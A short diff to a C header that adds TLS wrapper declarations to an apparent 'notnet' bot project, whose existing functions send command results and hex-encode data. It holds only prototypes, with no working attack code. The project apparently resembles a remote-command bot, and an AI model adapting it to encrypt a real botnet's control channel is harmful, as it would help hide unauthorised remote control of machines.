@@ -157,6 +157,23 @@ int protocol_resolve_host(const char *host);
 char *protocol_hex_encode(const char *data, int len);
 int protocol_send_response(notnet_bot_t *bot, const char *command, const char *result);
 
+/* ── TLS ─────────────────────────────────────────────────────── */
+/* TLS wrapper for existing socket fds.
+ * TLS_ENABLED must be defined at compile time (-DTLS_ENABLED).
+ * If TLS is not compiled in, tls_* functions are no-ops that pass
+ * through to the raw socket. */
+typedef struct {
+    int enabled;
+    void *ssl;       /* SSL* from OpenSSL, or NULL if TLS disabled */
+    int sock;        /* underlying socket fd */
+} notnet_tls_t;
+
+int tls_init(notnet_tls_t *tls, int sock);
+int tls_handshake(notnet_tls_t *tls, const char *server_name);
+int tls_send(notnet_tls_t *tls, const char *buf, int len);
+int tls_recv(notnet_tls_t *tls, char *buf, int len);
+void tls_close(notnet_tls_t *tls);
+
 /* ── Config ─────────────────────────────────────────────────── */
 int load_config(notnet_bot_t *bot, const char *path);
 
